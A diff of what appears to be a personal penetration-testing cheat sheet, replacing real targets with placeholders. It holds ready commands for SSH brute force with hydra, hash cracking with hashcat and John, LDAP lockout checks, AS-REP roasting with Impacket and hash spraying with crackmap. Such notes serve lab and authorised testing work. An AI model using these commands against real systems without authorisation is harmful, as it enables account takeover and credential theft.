@@ -28,7 +28,7 @@
   - **username-anarchy** 
   - `./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt`
   - **theHarvester**
-    - `theHarvester -d tesla.com -b all -l 500` 
+    - `theHarvester -d url.com -b all -l 500` 
     - `whatsmyname -u username`
 
 ## Passwords
@@ -39,7 +39,7 @@
 		- **python-exrex** permutates common default PWs schemas 
   - Brute force: 
     - hydra
-	    - `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4 -V
+	    - `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP -t 4 -V
 		- 4 is 4 threads`
 		  - -V is for verbosity
     - FUFF
@@ -63,7 +63,7 @@
 - `hashcat -m 0 {hash file} /usr/share/wordlists/rockyou.txt`
 
 **Johntheripper**
-- `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt bluehashes.txt`
+- `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`
 - Can save the hash into a file called hash and use John the Ripper with rockyou
 - `john hash --format=krb5asrep`
 - update above to be whatever hash format, this is for kerberos
@@ -72,16 +72,17 @@
 	- `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256`
 
 **Check out account lockout policy:**
-- `ldapsearch -D 'DOMAIN\support' -w '#00^Domain' -p 389 -h 0.0.0.0 - b "dc=domain,dc=local" -s sub "*" | grep lockoutThreshold`
+- `ldapsearch -D 'DOMAIN\support' -w '#00^Domain' -p 389 -h IP - b "dc=domain,dc=local" -s sub "*" | grep lockoutThreshold`
 - lockout threshold of 0 means unlimited
 
 **Get Hash:**
 - Impacket can be used to request a TGT
-	- `GetNPUsers.py domain.local/username -dc-ip 10.10.10.161 -no-pass`
+	- `GetNPUsers.py domain.local/username -dc-ip IP -no-pass`
+ 	- `impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip IP domainname/`
 
 **With Hashes:** 
 - Spray with crackmap:
-	- `cme smb 10.10.10.192 -u users -H hashes`
+	- `cme smb IP -u users -H hashes`
 	- this will spit out any working username: password
 
 **Secrets dump:**
